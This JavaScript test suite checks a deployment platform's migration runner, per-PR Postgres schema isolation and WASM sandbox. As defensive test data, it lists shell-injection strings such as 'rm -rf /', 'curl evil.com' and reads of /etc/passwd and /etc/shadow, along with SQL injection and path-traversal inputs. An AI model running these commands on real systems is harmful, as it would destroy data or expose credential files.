const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const { MigrationRunner, parseSafeMigrationArgv } = require('../server/services/migrationRunner');
const { PreviewManager, rewriteDatabaseUrlWithSchema, redactDatabaseUrl } = require('../server/services/previewManager');
const {
  WasmMicroRunner,
  detectWasmHandler,
  buildMinimalHttpTestWasm,
  buildInfiniteLoopTestWasm
} = require('../server/services/wasmMicroRunner');

/**
 * Suite Cycle #4: Atomic Single-Leader Pre-Deploy DB Migrations, Per-PR Postgres
 * Schema Isolation (`dokploy#2462`), and Isolated `<2ms` Micro-Wasm Edge Runtime.
 *
 * Runs 100% isolated inside `os.tmpdir()` — ZERO mutations to live `data/`.
 */
async function runTests() {
  console.log('--- Iniciando Tests de Atomic Migrations, PR Postgres Schema Isolation y Micro-Wasm ---');

  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mig-wasm-'));
  const leaseDir = path.join(tmpRoot, 'leases');
  const previewDataDir = path.join(tmpRoot, 'previews');
  const wasmDir = path.join(tmpRoot, 'wasm-app');
  const spinDir = path.join(tmpRoot, 'spin-app');
  const evilSpinDir = path.join(tmpRoot, 'evil-spin');
  fs.mkdirSync(previewDataDir, { recursive: true });
  fs.mkdirSync(wasmDir, { recursive: true });
  fs.mkdirSync(spinDir, { recursive: true });
  fs.mkdirSync(evilSpinDir, { recursive: true });

  const wasmRunner = new WasmMicroRunner({ defaultTimeoutMs: 1000 });
  const prevMgr = new PreviewManager({ dataDir: previewDataDir });
  let passed = 0;

  const runCase = async (name, fn) => {
    await fn();
    passed++;
    console.log(`  ✓ ${name}`);
  };

  try {
    // =========================================================================
    // 1. ZERO-SHELL MIGRATION ARGV PARSER & INJECTION REJECTION
    // =========================================================================
    await runCase('1. parseSafeMigrationArgv accepts valid commands & blocks shell injection', async () => {
      assert.deepStrictEqual(parseSafeMigrationArgv('npx prisma migrate deploy'), ['npx', 'prisma', 'migrate', 'deploy']);
      assert.deepStrictEqual(parseSafeMigrationArgv(['alembic', 'upgrade', 'head']), ['alembic', 'upgrade', 'head']);
      assert.deepStrictEqual(parseSafeMigrationArgv('php artisan migrate --force'), ['php', 'artisan', 'migrate', '--force']);

      const malicious = [
        'prisma migrate deploy; rm -rf /',
        'prisma migrate deploy && curl evil.com',
        'prisma migrate deploy | cat /etc/passwd',
        'prisma migrate `whoami`',
        'prisma migrate $(id)',
        'prisma migrate > /tmp/out',
        'prisma migrate < /etc/shadow',
        'prisma migrate\nwhoami',
        'prisma migrate\0id',
        'sh -c "echo pwned"',
        'bash -c "id"',
        '/bin/sh -c id',
        'cmd.exe /c dir',
        ['node', 'migrate.js;id']
      ];
      for (const bad of malicious) {
        assert.throws(() => parseSafeMigrationArgv(bad), /inyección|prohibido|operador|sustituci|control|intérprete|vacío/i, `Should reject: ${JSON.stringify(bad)}`);
      }
    });

    // =========================================================================
    // 2. PLAN MIGRATION + SINGLE-LEADER LEASE CONTENTION (kamal#1513)
    // =========================================================================
    await runCase('2. Single-leader lease rejects concurrent replica migration cleanly (HTTP 409)', async () => {
      const runner = new MigrationRunner({ leaseDir });
      const project = {
        id: 'proj_billing',
        name: 'Billing API',
        migrationCommand: 'npx prisma migrate deploy',
        envVars: { DATABASE_URL: 'postgresql://u:SUPER_SECRET_MIG_PASS@db:5432/billing' }
      };

      const plan = runner.planMigration(project, { containerName: 'billing-next', network: 'culkibo_net' });
      assert.strictEqual(plan.ok, true);
      assert.strictEqual(plan.zeroShell, true);
      assert.strictEqual(plan.snapshotRequired, true);
      assert.strictEqual(plan.abortCutoverOnFailure, true);
      assert.strictEqual(plan.lockKey, 'mig_proj_billing');
      assert.deepStrictEqual(plan.dockerArgs, ['exec', 'billing-next', 'npx', 'prisma', 'migrate', 'deploy']);

      /** @type {() => void} */
      let releaseFirst = () => {};
      const gate = new Promise((resolve) => { releaseFirst = () => resolve(undefined); });
      let firstStarted = false;
      /** @type {() => void} */
      let notifyStarted = () => {};
      const startedPromise = new Promise((resolve) => { notifyStarted = () => resolve(undefined); });

      const firstRun = runner.runMigration(project, {
        runner: async () => {
          firstStarted = true;
          notifyStarted();
          await gate;
          return { exitCode: 0, stdout: 'Applied 2 migrations (conn: postgresql://u:SUPER_SECRET_MIG_PASS@db:5432/billing)' };
        }
      });

      await startedPromise;
      assert.strictEqual(firstStarted, true);

      // Second concurrent replica MUST fail immediately with MIGRATION_LOCKED (409)
      await assert.rejects(
        () => runner.runMigration(project, { runner: async () => ({ exitCode: 0 }) }),
        (err) => err && err.code === 'MIGRATION_LOCKED' && err.status === 409
      );

      releaseFirst();
      const firstRes = await firstRun;
      assert.strictEqual(firstRes.ok, true);
      assert.strictEqual(firstRes.exitCode, 0);
      assert.strictEqual(firstRes.abortCutover, false);
      assert.ok(!firstRes.output.includes('SUPER_SECRET_MIG_PASS'), 'Migration output must redact DB password');
      assert.ok(firstRes.output.includes('[REDACTED]'));

      // After first finishes, lockfile must be released so subsequent run succeeds
      const thirdRes = await runner.runMigration(project, { runner: async () => ({ exitCode: 0, stdout: 'up to date' }) });
      assert.strictEqual(thirdRes.ok, true);
    });

    // =========================================================================
    // 3. STALE DEAD-PID & EXPIRED-TTL LEASE AUTO-RECOVERY
    // =========================================================================
    await runCase('3. Stale dead-PID and expired-TTL leases auto-recover without deadlock', async () => {
      const deadPid = 999991;
      const runner = new MigrationRunner({
        leaseDir,
        isPidAliveFn: (pid) => pid === process.pid
      });
      const project = { id: 'proj_crash_recovery', migrationCommand: 'alembic upgrade head' };
      const lockFile = path.join(leaseDir, 'mig_proj_crash_recovery.lock.json');

      // 3a. Simulate crashed daemon leaving a dead-PID lockfile with future TTL
      fs.mkdirSync(leaseDir, { recursive: true });
      fs.writeFileSync(lockFile, JSON.stringify({
        leaseId: 'crashed_lease_1',
        lockKey: 'mig_proj_crash_recovery',
        projectId: 'proj_crash_recovery',
        pid: deadPid,
        acquiredAt: new Date(Date.now() - 5000).toISOString(),
        expiresAt: new Date(Date.now() + 600000).toISOString()
      }), 'utf8');

      const resDead = await runner.runMigration(project, {
        runner: async () => ({ exitCode: 0, stdout: 'recovered after crash' })
      });
      assert.strictEqual(resDead.ok, true);
      assert.ok(resDead.recoveredStaleLease, 'Should report recovered dead-PID lease');
      assert.strictEqual(resDead.recoveredStaleLease.reason, 'dead_pid');
      assert.strictEqual(resDead.recoveredStaleLease.previousPid, deadPid);
      assert.strictEqual(fs.existsSync(lockFile), false, 'Lockfile must be cleaned up after completion');

      // 3b. Simulate expired TTL even with live PID
      fs.writeFileSync(lockFile, JSON.stringify({
        leaseId: 'expired_lease_2',
        lockKey: 'mig_proj_crash_recovery',
        projectId: 'proj_crash_recovery',
        pid: process.pid,
        acquiredAt: new Date(Date.now() - 120000).toISOString(),
        expiresAt: new Date(Date.now() - 1000).toISOString()
      }), 'utf8');

      const resExpired = await runner.runMigration(project, {
        runner: async () => ({ exitCode: 0, stdout: 'recovered after ttl' })
      });
      assert.strictEqual(resExpired.ok, true);
      assert.ok(resExpired.recoveredStaleLease);
      assert.strictEqual(resExpired.recoveredStaleLease.reason, 'ttl_expired');
    });

    // =========================================================================
    // 4. PRE-MIGRATION SNAPSHOT HOOK + ABORT CUTOVER ON FAILURE + REAL EXECFILE
    // =========================================================================
    await runCase('4. Pre-migration snapshot hook + abortCutover=true on failure + real execFile (shell:false)', async () => {
      const runner = new MigrationRunner({ leaseDir });
      const project = { id: 'proj_orders', migrationCommand: 'rails db:migrate' };
      const order = [];

      // 4a. Non-zero exit must run snapshot BEFORE migration, return abortCutover=true, and release lease!
      const failRes = await runner.runMigration(project, {
        onBeforeSnapshot: async ({ plan }) => {
          order.push(`snap:${plan.lockKey}`);
          return { snapshotId: 'snap_2026_orders_01' };
        },
        runner: async () => {
          order.push('migrate');
          return { exitCode: 1, stderr: 'ERROR: column "email" violates NOT NULL constraint' };
        }
      });
      assert.deepStrictEqual(order, ['snap:mig_proj_orders', 'migrate']);
      assert.strictEqual(failRes.ok, false);
      assert.strictEqual(failRes.exitCode, 1);
      assert.strictEqual(failRes.abortCutover, true);
      assert.strictEqual(failRes.snapshotId, 'snap_2026_orders_01');
      assert.strictEqual(fs.existsSync(path.join(leaseDir, 'mig_proj_orders.lock.json')), false, 'Lease must release in finally even on failure');

      // 4b. Real child process execution via execFile (shell: false) using Node itself
      const okScript = path.join(tmpRoot, 'mig-ok.js');
      const failScript = path.join(tmpRoot, 'mig-fail.js');
      fs.writeFileSync(okScript, 'console.log("MIGRATION_OK_42"); process.exit(0);\n', 'utf8');
      fs.writeFileSync(failScript, 'console.error("MIGRATION_FAIL_99"); process.exit(2);\n', 'utf8');

      const realOk = await runner.runMigration(
        { id: 'proj_real_exec' },
        { command: ['node', okScript], directExec: true, snapshotRequired: false }
      );
      assert.strictEqual(realOk.ok, true);
      assert.strictEqual(realOk.exitCode, 0);
      assert.strictEqual(realOk.abortCutover, false);
      assert.ok(realOk.output.includes('MIGRATION_OK_42'));

      const realFail = await runner.runMigration(
        { id: 'proj_real_exec' },
        { command: ['node', failScript], directExec: true, snapshotRequired: false }
      );
      assert.strictEqual(realFail.ok, false);
      assert.strictEqual(realFail.exitCode, 2);
      assert.strictEqual(realFail.abortCutover, true);
      assert.ok(realFail.output.includes('MIGRATION_FAIL_99'));
    });

    // =========================================================================
    // 5. PER-PR POSTGRES SCHEMA ISOLATION (dokploy#2462)
    // =========================================================================
    await runCase('5. Per-PR Postgres schema isolation + search_path URL rewrite + idempotent teardown', async () => {
      const project = { id: 'saas-web', name: 'SaaS Web' };
      const rawDbUrl = 'postgresql://appuser:TOP_SECRET_PG_PW@pg-prod:5432/saas_main?sslmode=require';

      // URL rewrite preserves existing params and appends options=-csearch_path%3Dpr_42
      const rewritten = rewriteDatabaseUrlWithSchema(rawDbUrl, 'pr_42');
      assert.ok(rewritten.includes('sslmode=require'), 'Must preserve existing query params');
      assert.ok(rewritten.includes('options=-csearch_path%3Dpr_42'), `Expected search_path option in ${rewritten}`);
      assert.ok(!redactDatabaseUrl(rewritten).includes('TOP_SECRET_PG_PW'));

      // Rejects invalid schema identifiers and SQL injection attempts
      assert.throws(() => rewriteDatabaseUrlWithSchema(rawDbUrl, 'pr_42; DROP TABLE users'), /inválido/i);
      assert.throws(() => prevMgr.planPreviewSchemaIsolation(project, '42; DROP SCHEMA public'), /inválido/i);
      assert.throws(() => prevMgr.planPreviewSchemaIsolation(project, '0'), /inválido/i);

      const schemaPlan = prevMgr.planPreviewSchemaIsolation(project, 42, {
        dbName: 'saas_main',
        username: 'appuser',
        containerName: 'culkibo-pg-prod',
        databaseUrl: rawDbUrl
      });

      assert.strictEqual(schemaPlan.ok, true);
      assert.strictEqual(schemaPlan.zeroShell, true);
      assert.strictEqual(schemaPlan.schemaName, 'pr_42');
      assert.strictEqual(schemaPlan.sqlTemplates.createSql, 'CREATE SCHEMA IF NOT EXISTS :"schema_name" AUTHORIZATION :"db_owner";');
      assert.strictEqual(schemaPlan.sqlTemplates.dropSql, 'DROP SCHEMA IF EXISTS :"schema_name" CASCADE;');
      assert.ok(schemaPlan.createArgv.includes('schema_name=pr_42'));
      assert.ok(schemaPlan.teardownArgv.includes('schema_name=pr_42'));
      assert.ok(schemaPlan.envOverride.DATABASE_URL.includes('options=-csearch_path%3Dpr_42'));
      assert.ok(!schemaPlan.databaseUrlRedacted.includes('TOP_SECRET_PG_PW'));

      // Verify zero plaintext password persisted on disk in preview-db-schemas.json
      const diskJson = fs.readFileSync(path.join(previewDataDir, 'preview-db-schemas.json'), 'utf8');
      assert.ok(!diskJson.includes('TOP_SECRET_PG_PW'), 'Plaintext DB password must NEVER be persisted to disk');

      // Idempotent teardown (1st call drops schema; 2nd call is clean no-op)
      /** @type {string[][]} */
      const executedArgvs = [];
      const td1 = await prevMgr.teardownPreviewSchemaIsolation('saas-web:pr-42', {
        executor: async (argv) => {
          executedArgvs.push(argv);
          return { code: 0, stdout: 'DROP SCHEMA' };
        }
      });
      assert.strictEqual(td1.ok, true);
      assert.strictEqual(td1.destroyed, true);
      assert.strictEqual(td1.alreadyCleaned, false);
      assert.strictEqual(executedArgvs.length, 1);
      assert.ok(executedArgvs[0].includes('DROP SCHEMA IF EXISTS :"schema_name" CASCADE;'));

      const td2 = await prevMgr.teardownPreviewSchemaIsolation('saas-web:pr-42', {
        executor: async () => {
          executedArgvs.push(['SHOULD_NOT_RUN']);
          return { code: 0 };
        }
      });
      assert.strictEqual(td2.ok, true);
      assert.strictEqual(td2.destroyed, false);
      assert.strictEqual(td2.alreadyCleaned, true);
      assert.strictEqual(executedArgvs.length, 1);
    });

    // =========================================================================
    // 6. MICRO-WASM HANDLER DETECTION (`spin.toml` + `*.wasm` + traversal guard)
    // =========================================================================
    await runCase('6. detectWasmHandler finds spin.toml & *.wasm and rejects path traversal', async () => {
      const minimalWasm = buildMinimalHttpTestWasm();
      const directWasmPath = path.join(wasmDir, 'edge.wasm');
      fs.writeFileSync(directWasmPath, minimalWasm);

      const direct = detectWasmHandler(wasmDir);
      assert.strictEqual(direct.detected, true);
      assert.strictEqual(direct.kind, 'wasm');
      assert.strictEqual(direct.wasmPath, directWasmPath);

      const spinWasmRel = path.join('dist', 'api.wasm');
      fs.mkdirSync(path.join(spinDir, 'dist'), { recursive: true });
      fs.writeFileSync(path.join(spinDir, spinWasmRel), minimalWasm);
      fs.writeFileSync(path.join(spinDir, 'spin.toml'), [
        'spin_manifest_version = 2',
        '[[trigger.http]]',
        'route = "/api/..."',
        'component = "api"',
        '[component.api]',
        'source = "dist/api.wasm"'
      ].join('\n'), 'utf8');

      const spinDet = detectWasmHandler(spinDir);
      assert.strictEqual(spinDet.detected, true);
      assert.strictEqual(spinDet.kind, 'spin');
      assert.strictEqual(spinDet.route, '/api/...');
      assert.strictEqual(spinDet.wasmPath, path.join(spinDir, spinWasmRel));

      // Path traversal inside spin.toml source MUST throw
      fs.writeFileSync(path.join(evilSpinDir, 'spin.toml'), [
        '[component.evil]',
        'source = "../../etc/passwd"'
      ].join('\n'), 'utf8');
      assert.throws(() => detectWasmHandler(evilSpinDir), /traversal|conteni|fuera/i);
    });

    // =========================================================================
    // 7. REAL .WASM EXECUTION IN ISOLATED WORKER_THREADS SANDBOX (<2ms warm)
    // =========================================================================
    await runCase('7. Real .wasm executes inside isolated worker_threads sandbox with verified compute & latency', async () => {
      const wasmBytes = buildMinimalHttpTestWasm();

      // Cold invocation (compiles & caches module inside isolated worker)
      const r1 = await wasmRunner.invoke({ wasmBytes, exportName: 'handle', args: [20], timeoutMs: 1000 });
      assert.strictEqual(r1.ok, true);
      assert.strictEqual(r1.status, 200);
      assert.strictEqual(r1.result, 41); // 20 * 2 + 1
      assert.strictEqual(r1.memoryBytes, 65536); // 1 WASM page = 64 KiB
      assert.strictEqual(r1.sandboxed, true);
      assert.strictEqual(r1.headers['x-culkibo-runtime'], 'micro-wasm');

      // Warm cached invocation (should execute in <2ms on typical hardware; generous CI cap <25ms)
      const r2 = await wasmRunner.invoke({ wasmBytes, exportName: 'handle', args: [100], timeoutMs: 1000 });
      assert.strictEqual(r2.ok, true);
      assert.strictEqual(r2.result, 201); // 100 * 2 + 1
      assert.ok(typeof r2.execMs === 'number' && r2.execMs >= 0 && r2.execMs < 25, `Unexpected warm execMs: ${r2.execMs}`);

      // Execute directly from detected spin.toml project directory via invokeProject
      const r3 = await wasmRunner.invokeProject({ localPath: spinDir }, { input: 7 });
      assert.strictEqual(r3.ok, true);
      assert.strictEqual(r3.result, 15); // 7 * 2 + 1

      // Reject non-WASM corrupted bytes immediately
      await assert.rejects(
        () => wasmRunner.invoke({ wasmBytes: Buffer.from('not-a-wasm-module') }),
        /mágica|WebAssembly/i
      );

      console.log(`    (Micro-Wasm metrics: cold execMs=${r1.execMs}ms, warm execMs=${r2.execMs}ms, mem=${r1.memoryBytes}B)`);
    });

    // =========================================================================
    // 8. INFINITE-LOOP WASM TERMINATED CLEANLY BY WALL-CLOCK TIMEOUT
    // =========================================================================
    await runCase('8. Infinite-loop WASM terminated cleanly by wall-clock timeout & sandbox recovers', async () => {
      const loopWasm = buildInfiniteLoopTestWasm();
      const t0 = Date.now();
      await assert.rejects(
        () => wasmRunner.invoke({ wasmBytes: loopWasm, exportName: 'handle', args: [1], timeoutMs: 150 }),
        (err) => err && err.code === 'WASM_TIMEOUT' && err.timedOut === true && err.status === 504
      );
      const elapsed = Date.now() - t0;
      assert.ok(elapsed >= 100 && elapsed < 2500, `Timeout termination took unexpected duration: ${elapsed}ms`);

      // Immediately after killing the rogue infinite-loop worker, a fresh sandbox MUST serve valid WASM!
      const recovered = await wasmRunner.invoke({
        wasmBytes: buildMinimalHttpTestWasm(),
        exportName: 'handle',
        args: [50],
        timeoutMs: 1000
      });
      assert.strictEqual(recovered.ok, true);
      assert.strictEqual(recovered.result, 101);
    });

    console.log(`\n✅ Migrations & Micro-Wasm Suite: ${passed}/8 tests PASSED!`);
  } finally {
    await wasmRunner.shutdown();
    try { fs.rmSync(tmpRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

if (require.main === module) {
  runTests().catch((err) => {
    console.error('❌ Migrations & Micro-Wasm test failed:', err);
    process.exit(1);
  });
}

module.exports = runTests;
